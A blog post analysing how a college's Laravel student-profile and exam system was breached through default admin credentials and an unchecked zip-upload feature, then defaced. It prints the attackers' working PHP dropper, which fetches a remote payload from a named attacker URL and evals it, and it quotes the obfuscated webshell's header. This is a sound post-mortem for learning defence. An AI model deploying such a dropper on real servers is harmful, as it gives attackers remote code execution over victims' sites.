+++
title = "How Deerwalk College's Doko was Hacked"
date = 2025-06-26
description = "Deerwalk College's Student Profile and Exam papers management system Doko was hacked by Indo hackers"
[taxonomies]
categories = ["tech"]
tags = ["deerwalk","cybersecurity"]
[extra]
lang = "en"
toc = true
+++

> TLDR: Insecure credentials and file upload vulnerability in the zip file parsing funtionality gives hackers RCE in the system. Which is then used to Deface the website.

# Context
A few week ago, Deerwalk college's student profile and exam paper management system [Doko](https://doko.dwit.edu.np) was hacked by Indonesian hackers and defaced to show a online casino slot platform. The DevOps team went into damage control mode and changes were made. The first thing we did was change the Policy of the security group of our Amazon EC2 instance to only allow connections from within the college network. We werent quite sure of how the hacker got in or how they managed to deface our application which was built with Laravel.


# Analysis
A few days later I was sent the `access` and `error` logs by the DevOps team to properly analyze the network traffic to figure out how they got in. I saw a Indobesian IP address logging in to our system. How did they get our credentials? Turns out we were using the username `admin` and the password of `password` when we were developing the application and never really got around to changing it. Now the hacker had access to the management/admin panel, great.

# RCE?

How did they get remote code execution on our system? As I was going through our uploads directory and was searching for a potential file upload vulnerability and there it was. A rogue `.php` file (`"Srijal Jaisi.php"`) with a real students name.

We had a "bulk upload" feature into our website where the admin could upload a zip with compressed images and the backend would unzip it and place it in a publicly indexable place (/uploads). However we did not have checks to ensure that the file uploaded was indeed an image file. Which led the hacker who already had access to upload a php file.

{{ figure(src="/img/dropper.png" alt="The Plan" via=" ") }}


# A deeper look

Looking into the `.php` stage 1 dropper file we see
```php
<?php
    $Url = "https://bujang.online/raw/AbSGSvJgKn";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);
   ?>
```
The dropper loads the malware from the `https://bujang.online/raw/AbSGSvJgKn` URL and then evals it. Looking at the content from `https://bujang.online/raw/AbSGSvJgKn`. We can see that its heavily obfusticated.

The payload starts with 

```php
<?php
/*   __________________________________________________
    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
    |              on 2023-09-19 01:16:16              |
    |    GitHub: https://github.com/pk-fr/yakpro-po    |
    |__________________________________________________|
*/
 goto E1NcZ;
 ```

which tells us that they are using a open source php obfusticator called Yak Pro. The payload is over 1500 lines long and full of `goto` statements which makes it impossible to analyse it manually. First thing I did was "prettify" the file such that it's somewhat readable. Once it was readable, I was able to understand and research on some parts of the file. All the variable names were in Indonesian which was more evidence that the hacker was indeed from Indonesia.

Uploading the php file in VirusTotal led us to [this article](https://www.foregenix.com/blog/php-webshell-barner-detect-website-malware) from which we were now certain that this was a sophisticated full administrator access. This is how the hacker had been defacing Doko and when we removed all the static files from the server (images/documents) the hackers webshell access is removed and we no longer have issues.

# Conclusion
There was a LOT that could have been better from our side. For starters we did not change the insecure default credentials, which was a huge factor into how the hacker got in. In our code we did not have file validation and checks for the zip feature. We should have been a lot more careful especially since the app was built with php. We'll be deploying the new version of Doko on the first week of July. If you want to look into the file and research yourself then I've kept all the payloads in [this repository](https://github.com/aashu10sh/doko_hacked).

# Doko 3.0
Doko 3.0 was already in development when the current verson was hacked, this new doko(3.0) is built under the leadership of Krish Devkota with a much modern tech stack and security practices in mind and new doko should be out within the first week of July.
